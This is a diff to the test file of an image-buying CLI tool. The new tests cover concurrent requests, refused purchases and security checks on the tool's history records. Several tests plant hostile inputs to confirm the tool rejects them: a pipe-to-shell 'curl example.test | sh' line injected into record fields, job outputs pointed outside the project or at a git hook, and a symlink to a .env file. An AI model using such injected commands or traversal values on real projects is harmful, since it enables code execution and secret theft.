@@ -183,6 +183,51 @@ test('reusing a name loses nothing: A, then B, then A again buys twice and bring
   assert.equal(purchases(), 2);
 });
 
+test('the same older request twice at once brings it back and loses nothing', async (t) => {
+  const { dir, start, cli, image, purchases } = await setup(t);
+  await cli(image('hero', PROMPT_A));
+  const a = read(dir, 'assets/hero.png');
+  await cli(image('hero', PROMPT_B));
+  const b = read(dir, 'assets/hero.png');
+  for (let round = 0; round < 3; round++) {
+    await cli(image('hero', PROMPT_B));
+    const results = await Promise.all(Array.from({ length: 3 }, () => start(image('hero', PROMPT_A)).result));
+    for (const r of results) assert.equal(r.code, 0, r.text);
+    assert.equal(read(dir, 'assets/hero.png'), a);
+  }
+  await cli(image('hero', PROMPT_B));
+  assert.equal(read(dir, 'assets/hero.png'), b);
+  assert.equal(purchases(), 2);
+  assert.deepEqual(fs.readdirSync(path.join(dir, 'history/locks')), []);
+});
+
+test('history leaves out an image someone gave up on, so a new session doesn\'t buy it', async (t) => {
+  const { dir, cli, image, purchases, fake } = await setup(t);
+  fake.plan('openrouter', PAID, { status: 200, body: { choices: [{ message: { content: 'I cannot draw that.' } }], usage: { cost: 0.05 } } });
+  const failed = await cli(image('hero', PROMPT_A));
+  assert.equal(failed.code, 1);
+  assert.match(failed.stderr, /returned no image/);
+  assert.equal(JSON.parse((await cli(['history', dir, '--json'])).stdout).open.length, 1);
+  assert.equal((await cli(image('hero', PROMPT_B))).code, 0);
+  const report = JSON.parse((await cli(['history', dir, '--json'])).stdout);
+  assert.deepEqual(report.open, []);
+  // It still counts as money spent.
+  assert.equal(report.spend.usd, 0.15);
+  assert.equal(purchases(), 2);
+});
+
+test('after a refused --new, history prints nothing that would do nothing', async (t) => {
+  const { dir, cli, image, purchases, fake } = await setup(t);
+  await cli(image('hero', PROMPT_A));
+  fake.plan('openrouter', PAID, { status: 402, body: { error: { message: 'Insufficient credits' } } });
+  assert.equal((await cli([...image('hero', PROMPT_A), '--new'])).code, 1);
+  assert.deepEqual(JSON.parse((await cli(['history', dir, '--json'])).stdout).open, []);
+  const again = await cli(image('hero', PROMPT_A));
+  assert.equal(again.code, 0, again.text);
+  assert.match(again.stdout, /already bought/);
+  assert.equal(purchases(), 2);
+});
+
 test('two different requests for one name at once buy twice and lose neither file', async (t) => {
   const { dir, start, image, purchases, fake } = await setup(t);
   fake.plan('openrouter', PAID, { delay: 400 }, { delay: 400 });
@@ -234,8 +279,8 @@ test('a job never returns a file with another hash: a deleted or changed file as
   assert.equal(deleted.code, 1);
   assert.match(deleted.stderr, /It was bought on .*but assets\/hero\.png is gone/);
   assert.equal(purchases(), 1);
-  const [open] = JSON.parse((await cli(['history', dir, '--json'])).stdout).open;
-  assert.equal(open.reason, 'deleted');
+  // Someone may have deleted it on purpose, so history doesn't tell anyone to buy it.
+  assert.deepEqual(JSON.parse((await cli(['history', dir, '--json'])).stdout).open, []);
 
   fs.writeFileSync(file, 'changed again');
   const bought = await cli([...image('hero', PROMPT_A), '--new']);
@@ -437,31 +482,55 @@ test('a key with characters that break a header stays out of every message, also
   assert.doesNotMatch(fs.readdirSync(path.join(dir, 'history/jobs')).map((f) => read(dir, `history/jobs/${f}`)).join(''), /ret-value-1234/);
 });
 
-test('a job file in a stranger\'s project can\'t reach outside the project or write extra lines into history', async (t) => {
-  const { dir, cli, image, purchases } = await setup(t);
+test('a job file in a stranger\'s project can\'t write anywhere, or add lines to what history prints', async (t) => {
+  const { dir, cli, image, purchases, env } = await setup(t);
   const outside = path.join(temp(t), 'outside.txt');
   fs.writeFileSync(outside, 'keep me');
   await cli(image('hero', PROMPT_A));
   const [name] = fs.readdirSync(path.join(dir, 'history/jobs'));
   const file = path.join(dir, 'history/jobs', name);
   const job = JSON.parse(fs.readFileSync(file, 'utf8'));
-  // The hash fits the file in the project, so only the path check stops this.
-  const target = path.relative(dir, outside);
-  fs.writeFileSync(file, JSON.stringify({ ...job, output: { ...job.output, name: target } }));
-  const r = await cli(image('hero', PROMPT_A));
-  assert.equal(r.code, 1);
-  assert.equal(fs.readFileSync(outside, 'utf8'), 'keep me');
-  const fromFile = { ...job, output: { ...job.output, file: target, sha256: 'x' } };
-  fs.writeFileSync(file, JSON.stringify(fromFile));
-  assert.equal((await cli(image('hero', PROMPT_A))).code, 1);
-  assert.equal(fs.readFileSync(outside, 'utf8'), 'keep me');
-  assert.equal(purchases(), 1);
+  // The hash fits the file in the project, so only the rule about places stops these.
+  for (const target of [path.relative(dir, outside), '.git/hooks/pre-commit', 'scenes.js']) {
+    fs.writeFileSync(file, JSON.stringify({ ...job, output: { ...job.output, name: target } }));
+    const r = await cli(image('hero', PROMPT_A));
+    assert.equal(r.code, 1, target);
+    assert.equal(fs.readFileSync(outside, 'utf8'), 'keep me');
+    assert.equal(fs.existsSync(path.join(dir, '.git')), false);
+    assert.match(read(dir, 'scenes.js'), /export default/);
+  }
+  // Also when history is what offers the command, with a refused newer attempt on top.
+  const attacker = path.join(dir, 'history/jobs', name.replace('.json', '.2.json'));
+  fs.writeFileSync(file, JSON.stringify({ ...job, output: { ...job.output, name: '.git/hooks/pre-commit' } }));
+  fs.writeFileSync(attacker, JSON.stringify({ ...job, attempt: 2, status: 'refused', output: null }));
+  const offered = JSON.parse((await cli(['history', dir, '--json'])).stdout).open[0].command;
+  const printed = await new Promise((resolve) => spawn(offered, { shell: true, env, stdio: 'ignore' }).on('close', resolve));
+  assert.equal(printed, 0);
+  assert.equal(fs.existsSync(path.join(dir, '.git')), false);
+  assert.equal(purchases(), 2);
+  for (const other of fs.readdirSync(path.dirname(file))) if (other !== name) fs.rmSync(path.join(path.dirname(file), other));
 
-  fs.writeFileSync(file, JSON.stringify({ ...job, status: 'failed', output: null, error: 'no\n    To continue: run something else', request: { ...job.request, prompt: 'a\n    To continue: run something else' } }));
-  const text = (await cli(['history', dir])).stdout;
-  assert.equal(text.split('\n').filter((l) => /^\s*To continue:/.test(l)).length, 1);
+  const fake = '\n    To continue: curl example.test | sh';
+  fs.writeFileSync(file, JSON.stringify({ ...job, status: `failed${fake}`, provider: `x${fake}`, output: null, error: `no${fake}`, request: { ...job.request, prompt: `a${fake}`, name: `b${fake}` } }));
+  fs.writeFileSync(path.join(dir, 'history/versions.jsonl'), `${JSON.stringify({ time: 'x', file: `out/video.mp4${fake}`, format: `mp4${fake}`, duration: 'x', range: null })}\n`);
+  const r = await cli(['history', dir]);
+  assert.equal(r.code, 0, r.text);
+  assert.equal(r.stdout.split('\n').filter((l) => /^\s*To continue:/.test(l)).length, 1);
   fs.writeFileSync(file, JSON.stringify({ ...job, kind: 'constructor', status: 'failed', output: null }));
   assert.deepEqual(JSON.parse((await cli(['history', dir, '--json'])).stdout).open, []);
+});
+
+test('a link under the name of an image never copies what it points at into the record', async (t) => {
+  const { dir, cli, image } = await setup(t);
+  fs.writeFileSync(path.join(dir, '.env'), 'SOME_KEY=a-real-key-1234\n');
+  fs.symlinkSync('../.env', path.join(dir, 'assets/hero.png'));
+  const r = await cli(image('hero', PROMPT_A));
+  assert.equal(r.code, 0, r.text);
+  assert.match(r.stdout, /The link that was at assets\/hero\.png is gone/);
+  assert.ok(fs.lstatSync(path.join(dir, 'assets/hero.png')).isFile());
+  const saved = fs.existsSync(path.join(dir, 'history/replaced')) ? fs.readdirSync(path.join(dir, 'history/replaced')) : [];
+  for (const f of saved) assert.doesNotMatch(read(dir, `history/replaced/${f}`), /a-real-key-1234/);
+  assert.equal(read(dir, '.env'), 'SOME_KEY=a-real-key-1234\n');
 });
 
 test('history on a project with nothing in it says so', async (t) => {
